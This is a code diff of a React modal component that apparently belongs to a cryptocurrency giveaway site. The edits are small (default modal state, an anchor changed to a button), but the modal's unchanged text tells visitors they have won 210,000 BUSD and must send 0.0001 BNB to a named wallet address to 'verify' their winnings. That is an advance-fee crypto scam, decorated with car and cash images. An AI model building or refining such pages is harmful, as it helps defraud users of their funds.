@@ -18,7 +18,7 @@ const customStyles = {
 // Make sure to bind modal to your appElement (https://reactcommunity.org/react-modal/accessibility/)
 const { forwardRef, useRef, useImperativeHandle } = React;
 const Winmodal= forwardRef((props, ref) =>{
-    const [modalIsOpen, setIsOpen] = React.useState(true);
+    const [modalIsOpen, setIsOpen] = React.useState(false);
     useImperativeHandle(ref, () => ({
         openModal: () => {
             setIsOpen(true)
@@ -50,7 +50,7 @@ const Winmodal= forwardRef((props, ref) =>{
                     To claim your winnings, you must send 0.0001 BNB to 0xc0D9ABbAc582a5347370035c5d3cB5923e6ed1D0
                     This is how we verify that you are active and are in control of your wallet. You will then be sent the 210,000 BUSD!
                 </div>
-                <a className="btn-main btn-white mx-auto mt-3" onClick={closeModal}>Verify your winnings</a>
+                <button className="btn-main btn-white mx-auto mt-3" onClick={closeModal}>Verify your winnings</button>
                 <img src="images/lambo2.png" alt="Lambo car" className="modallambo" />
                 <img src="images/money.png" alt="Cash" className="moneybg" />
             </div>
